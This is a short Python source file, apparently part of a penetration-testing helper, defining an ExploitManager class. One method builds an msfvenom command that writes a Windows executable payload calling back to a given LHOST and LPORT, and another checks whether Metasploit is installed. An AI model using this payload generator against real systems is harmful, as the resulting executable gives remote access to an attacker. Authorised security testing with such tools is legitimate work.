# exploit_manager.py - Fixed version
class ExploitManager:
    def generate_payload(self, payload_type, lhost, lport):
        """Generate exploit payload command"""
        return {
            'type': payload_type,
            'lhost': lhost,
            'lport': lport,
            'command': f'msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe > payload.exe'
        }
    
    def check_metasploit(self):
        """Check if Metasploit is available"""
        import subprocess
        try:
            result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False